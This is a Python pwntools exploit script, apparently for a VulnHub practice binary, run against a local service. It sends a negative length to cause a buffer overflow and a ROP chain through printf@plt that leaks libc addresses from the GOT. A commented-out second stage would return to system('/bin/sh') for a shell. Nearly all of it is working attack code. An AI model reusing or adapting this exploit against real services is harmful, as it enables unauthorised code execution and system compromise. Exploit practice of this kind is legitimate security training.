#!/usr/bin/env python

from pwn import *
#r = remote("localhost", 2323)
r = remote("localhost", 1338)

buf = ""
buf += "A"*48
buf += p32(0x08048370)           # printf@plt
#buf += p32(0x0804852f)           # return to vuln()
buf += p32(0x0804864e)		 # popopret
buf += p32(0x08048702)           # str: .... %s ....
buf += p32(0x0804a00c)           # ptr to printf@got
buf += p32(0x08048370)           # printf@plt
buf += "AAAA"
buf += p32(0x08048702)           # str: .... %s ....
buf += p32(0x0804a018)		 # lib

print "++++ STAGE 1 ++++"

# send size of bytes to read
print r.recv()
r.sendline("-1")
print r.recv()

# send first stage payload to leak libc addr
# returns to printf@plt to leak addr of printf@got and getchar@got
print "Sending stage 1 payload: leak libc"
r.sendline(buf)
r.recvline()
r.recvline()
d = r.recvline()    # get leaked addresses
e = r.recvline()

# leaked printf@got
addr_printf  = u32(d[:4])
addr_start   = u32(d[:4])
print "addr_printf ", hex(addr_printf)
print "addr_start ", hex(addr_start)


# used libc-database to identify libc version, and obtain printf()'s offset
# ubuntu-trusty-i386-libc6 (id libc6_2.19-0ubuntu6.6_i386)
#offset_printf  = 0x0004d280

# libc base address
#libc_base = addr_printf - offset_printf
#print "libc_base", hex(libc_base)

# libc-database found these offsets for system() and "/bin/sh"
#system_addr = libc_base + 0x00040190
#bin_sh_addr = libc_base + 0x160a24

#print "system_addr", hex(system_addr)
#print "/bin/sh addr", hex(bin_sh_addr)

#print ""
#print "++++ STAGE 2 ++++"

# stage 2, overwrite EIP all over again, but this time we have system("/bin/sh") to return to
#buf = ""
#buf += "A"*48
#buf += p32(system_addr)
#buf += "XXXX"
#buf += p32(bin_sh_addr)

#r.sendline("-1")
#print r.recv()

#print "Sending stage 2 payload: system(\"/bin/sh\")"
#r.sendline(buf)
#print r.recv()

#print "VulnHub FTW!"
#r.interactive()
